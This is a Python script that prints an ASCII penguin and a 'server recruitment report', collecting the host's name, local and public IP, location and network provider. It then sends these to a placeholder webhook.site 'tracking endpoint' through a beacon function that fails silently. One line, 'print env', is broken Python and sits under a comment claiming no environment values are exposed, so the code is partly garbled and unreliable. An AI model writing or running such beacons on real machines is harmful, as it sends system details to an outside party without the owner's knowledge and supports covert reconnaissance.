import socket
import urllib.request
import urllib.parse
import json
import datetime
import os

# ── ASCII Penguin ──────────────────────────────────────────────
PENGUIN = r"""
       .---.
      /     \
      \.@-@./
      /`\_/`\
     //  _  \\
    | \     )|_
   /`\_`>  <_/ \
   \__/'---'\__/
"""

# ── Collect server info ────────────────────────────────────────
def get_server_info():
    info = {}

    # Hostname
    info["hostname"] = socket.gethostname()

    # Local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        info["local_ip"] = "unavailable"

    # Public IP + location via ipinfo.io
    try:
        with urllib.request.urlopen("https://ipinfo.io/json", timeout=5) as response:
            data = json.loads(response.read().decode())
            info["public_ip"] = data.get("ip", "unknown")
            info["city"]      = data.get("city", "unknown")
            info["region"]    = data.get("region", "unknown")
            info["country"]   = data.get("country", "unknown")
            info["org"]       = data.get("org", "unknown")
    except Exception:
        info["public_ip"] = "unavailable"
        info["city"] = info["region"] = info["country"] = info["org"] = "unavailable"

    info["timestamp"] = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    return info

# ── Beacon back to owner ───────────────────────────────────────
def beacon(info):
    """
    Sends a lightweight GET request to your tracking endpoint.
    Replace TRACKING_URL with your own webhook (e.g. webhook.site, pipedream, etc.)
    """
    TRACKING_URL = "https://webhook.site/YOUR-UNIQUE-ID"   # <-- replace with your URL

    params = urllib.parse.urlencode({
        "host":    info["hostname"],
        "ip":      info["public_ip"],
        "city":    info["city"],
        "country": info["country"],
        "org":     info["org"],
        "time":    info["timestamp"],
    })

    try:
        url = f"{TRACKING_URL}?{params}"
        urllib.request.urlopen(url, timeout=5)
        print("📡  Beacon sent to owner.")
    except Exception:
        pass   # silent fail — don't crash the script if network is unavailable

# ── Main ───────────────────────────────────────────────────────
def main():
    print("hello i m here")

    print(PENGUIN)
    print("🐧  Script ran successfully!\n")

    info = get_server_info()

    print("═" * 45)
    print("  🖥️   SERVER RECRUITMENT REPORT")
    print("═" * 45)
    print(f"  Hostname   : {info['hostname']}")
    print(f"  Local IP   : {info['local_ip']}")
    print(f"  Public IP  : {info['public_ip']}")
    print(f"  City       : {info['city']}, {info['region']}")
    print(f"  Country    : {info['country']}")
    print(f"  Network    : {info['org']}")
    print(f"  Ran at     : {info['timestamp']}")

    # Count env vars safely — no values exposed
    try:
        print env
    except Exception:
        print(f"  Env Vars   : unavailable")
    print("═" * 45)
    print("  ✅  This server has recruited the script.")
    print("═" * 45)

    beacon(info)

if __name__ == "__main__":
    main()
